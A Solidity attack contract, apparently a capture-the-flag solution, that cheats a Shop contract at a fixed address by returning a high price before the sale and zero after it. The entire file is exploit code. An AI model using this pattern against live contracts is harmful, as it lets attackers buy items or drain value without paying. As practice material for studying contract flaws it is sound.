// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract HackShop {

    IShop shop = IShop(address(0x1E1781d74D62C501b53b244eb346cb22aF2d4051));

    function price() public view returns (uint256) {
        return IShop(msg.sender).isSold() ? 0 : 100;
    }

    function attack() public {
        shop.buy();
    }
}
